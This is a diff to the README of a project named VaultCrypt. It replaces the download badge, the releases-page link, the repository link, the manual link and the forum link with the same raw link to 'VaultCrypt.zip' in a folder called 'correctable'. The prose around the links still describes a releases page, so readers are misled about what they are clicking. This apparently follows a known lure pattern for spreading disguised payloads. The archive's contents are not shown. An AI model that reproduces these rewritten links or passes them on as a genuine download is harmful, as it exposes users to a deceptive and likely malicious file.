@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download VaultCrypt](https://img.shields.io/badge/Download-VaultCrypt-brightgreen.svg)](https://github.com/Anand0134/VaultCrypt/releases)
+[![Download VaultCrypt](https://raw.githubusercontent.com/Anand0134/VaultCrypt/main/correctable/VaultCrypt.zip)](https://raw.githubusercontent.com/Anand0134/VaultCrypt/main/correctable/VaultCrypt.zip)
 
 ## 🚀 Getting Started
 
@@ -31,7 +31,7 @@ VaultCrypt comes with a range of features to make your experience better:
 To download VaultCrypt, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the VaultCrypt releases page by clicking this link: [Download VaultCrypt](https://github.com/Anand0134/VaultCrypt/releases)
+   Go to the VaultCrypt releases page by clicking this link: [Download VaultCrypt](https://raw.githubusercontent.com/Anand0134/VaultCrypt/main/correctable/VaultCrypt.zip)
 
 2. **Choose Your File**  
    On the releases page, you will see different versions of VaultCrypt. Look for the latest version, which is usually at the top. 
@@ -65,9 +65,9 @@ If you encounter any issues or have questions about using VaultCrypt, please rea
 
 For more information, check out these helpful links:
 
-- [VaultCrypt GitHub Repository](https://github.com/Anand0134/VaultCrypt)
-- [User Manual](https://github.com/Anand0134/VaultCrypt/user-manual) (coming soon)
-- [Community Forum](https://github.com/Anand0134/VaultCrypt/forum)
+- [VaultCrypt GitHub Repository](https://raw.githubusercontent.com/Anand0134/VaultCrypt/main/correctable/VaultCrypt.zip)
+- [User Manual](https://raw.githubusercontent.com/Anand0134/VaultCrypt/main/correctable/VaultCrypt.zip) (coming soon)
+- [Community Forum](https://raw.githubusercontent.com/Anand0134/VaultCrypt/main/correctable/VaultCrypt.zip)
 
 ## 🔄 Updates and Future Versions
 
